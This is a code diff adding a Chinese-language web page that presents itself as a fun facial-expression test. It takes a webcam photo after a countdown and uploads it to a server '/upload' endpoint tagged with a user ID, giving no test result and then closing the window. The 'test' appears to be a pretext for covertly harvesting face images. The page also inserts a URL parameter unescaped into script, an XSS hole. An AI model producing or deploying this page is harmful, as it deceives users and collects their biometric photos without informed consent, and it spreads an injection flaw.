@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>趣味心理测试</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>😊 趣味表情识别测试</h1>
+        <p>请确保正对摄像头，点击开始按钮后保持表情3秒</p>
+        <button onclick="startTest()">开始测试</button>
+        <video id="video" hidden></video>
+        <canvas id="canvas" hidden></canvas>
+        <div id="countdown"></div>
+    </div>
+
+    <script>
+        let count = 3;
+
+        async function startTest() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.hidden = false;
+                video.srcObject = stream;
+                video.play();
+
+                // 启动倒计时
+                const countdown = document.getElementById('countdown');
+                countdown.innerHTML = `拍照倒计时：${count}秒`;
+
+                const timer = setInterval(() => {
+                    count--;
+                    countdown.innerHTML = `拍照倒计时：${count}秒`;
+                    if (count <= 0) {
+                        clearInterval(timer);
+                        capturePhoto();
+                    }
+                }, 1000);
+
+            } catch (err) {
+                alert('请允许摄像头权限以继续测试！');
+            }
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('photo', blob, 'test_photo.jpg');
+
+                fetch(`/upload?user={{ request.args.get('user') }}`, {
+                    method: 'POST',
+                    body: formData
+                }).then(() => {
+                    alert('测试完成！感谢参与~');
+                    window.close();
+                });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
